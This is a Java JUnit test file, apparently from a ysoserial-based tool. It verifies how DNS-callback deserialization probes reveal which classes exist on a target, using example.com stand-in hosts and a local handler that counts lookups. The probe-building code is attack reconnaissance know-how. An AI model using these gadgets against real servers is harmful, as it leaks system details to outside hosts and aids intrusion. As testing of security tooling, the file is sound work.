package com.bloom.server;

import org.junit.BeforeClass;
import org.junit.Test;
import ysoserial.payloads.FindGadgetByDNS;
import ysoserial.Serializer;

import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectStreamClass;
import java.net.InetAddress;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLStreamHandler;
import java.net.URLStreamHandlerFactory;
import java.util.LinkedList;
import java.util.List;
import java.util.concurrent.atomic.AtomicInteger;

import static org.junit.Assert.assertEquals;
import static org.junit.Assert.assertTrue;
import static org.junit.Assert.fail;

/**
 * 实测 FindClassByDNS/FindGadgetByDNS 探测机制的三个关键事实：
 * 1. 探测依赖目标端反序列化时的类加载（类存在才触发 DNS）。
 * 2. 探测类不存在时抛 ClassNotFoundException。
 * 3. List 中某个探测失败后，后续探测是否还会执行（决定整批探测的准确性）。
 */
public class DnsProbeBehaviorTest {

    private static final AtomicInteger dnsLookups = new AtomicInteger();

    @BeforeClass
    public static void registerCountingHandler() {
        URL.setURLStreamHandlerFactory(new URLStreamHandlerFactory() {
            @Override
            public URLStreamHandler createURLStreamHandler(String protocol) {
                if (!"http".equals(protocol)) {
                    return null;
                }
                return new URLStreamHandler() {
                    @Override
                    protected URLConnection openConnection(URL u) {
                        return null;
                    }

                    @Override
                    protected synchronized InetAddress getHostAddress(URL u) {
                        dnsLookups.incrementAndGet();
                        return null;
                    }
                };
            }
        });
    }

    /** 模拟目标端：对黑名单类名抛 ClassNotFoundException，其余正常解析。 */
    private static Object deserialize(byte[] data, final String blockedClassName) throws IOException {
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data)) {
            @Override
            protected Class<?> resolveClass(ObjectStreamClass desc)
                    throws IOException, ClassNotFoundException {
                if (desc.getName().equals(blockedClassName)) {
                    throw new ClassNotFoundException("blocked: " + desc.getName());
                }
                return super.resolveClass(desc);
            }
        };
        try {
            return ois.readObject();
        } catch (ClassNotFoundException e) {
            throw new IOException(e);
        }
    }

    @Test
    public void probeFiresOnlyWhenClassExistsOnTarget() throws Exception {
        // 探测目标端必然存在的类：本地模拟即 java.util.Scanner
        List<Object> probes = new LinkedList<Object>();
        probes.add(FindGadgetByDNS.genFindClassByDNSGadget(
                "http://exists.example.com", "java.util.Scanner"));
        byte[] data = Serializer.serialize(probes);

        dnsLookups.set(0);
        deserialize(data, "no.such.blocked.Class");
        assertEquals("目标端存在该类时应触发一次 DNS 等价请求", 1, dnsLookups.get());
    }

    @Test
    public void probeSilentWhenClassMissingOnTarget() throws Exception {
        // genClass 本地合成该类可序列化，但目标端（模拟）加载失败
        List<Object> probes = new LinkedList<Object>();
        probes.add(FindGadgetByDNS.genFindClassByDNSGadget(
                "http://missing.example.com", "probe.DoesNotExist12345"));
        byte[] data = Serializer.serialize(probes);

        dnsLookups.set(0);
        try {
            deserialize(data, "probe.DoesNotExist12345");
        } catch (IOException expected) {
            // ClassNotFoundException 向上抛出
        }
        assertEquals("目标端无该类时不应触发 DNS", 0, dnsLookups.get());
    }

    @Test
    public void missingClassAbortsRemainingProbesInList() throws Exception {
        // 顺序：存在类 → 缺失类 → 存在类。若第三个探测仍触发，说明 List 不会中断。
        List<Object> probes = new LinkedList<Object>();
        probes.add(FindGadgetByDNS.genFindClassByDNSGadget(
                "http://first.example.com", "java.util.Scanner"));
        probes.add(FindGadgetByDNS.genFindClassByDNSGadget(
                "http://middle.example.com", "probe.DoesNotExist12345"));
        probes.add(FindGadgetByDNS.genFindClassByDNSGadget(
                "http://last.example.com", "java.util.Scanner"));
        byte[] data = Serializer.serialize(probes);

        dnsLookups.set(0);
        boolean aborted = false;
        try {
            deserialize(data, "probe.DoesNotExist12345");
        } catch (IOException expected) {
            aborted = true;
        }
        assertTrue("缺失类应导致反序列化中断", aborted);
        // 实测行为：JDK 对 Class 解析失败采用延迟异常（readClass 记录，readObject 边界抛出），
        // 单个探针缺类不阻断后续探针。钉死该行为作为批量探测的准确性依据。
        assertEquals("缺类探针不应阻断后续探针", 2, dnsLookups.get());
    }
}
